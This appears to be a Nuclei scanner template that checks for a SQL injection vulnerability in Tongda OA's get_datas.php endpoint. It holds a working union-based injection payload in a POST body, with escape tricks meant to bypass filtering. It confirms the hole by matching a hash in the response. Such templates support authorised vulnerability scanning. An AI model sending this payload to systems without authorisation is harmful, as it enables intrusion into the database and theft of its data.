id: poc-yaml-tongda-oa-get-datas-php-sqli
info:
  name: 通达OA get_datas.php SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection

variables:
  t1: "{{rand_int(100, 10000)}}"
  t2: "{{md5(t1)}}"

http:
  - method: POST
    path:
      - "{{BaseURL}}/general/reportshop/utils/get_datas.php"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: |-
      USER_ID=OfficeTask&PASSWORD=&col=1,1&tab=5 where 1={`\='` 1} union (select uid,md5({{t1}}) from user_online where 1\={`=` 1})-- '1
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "{{t2}}"
      - type: word
        part: header
        words:
          - "charset=gbk"
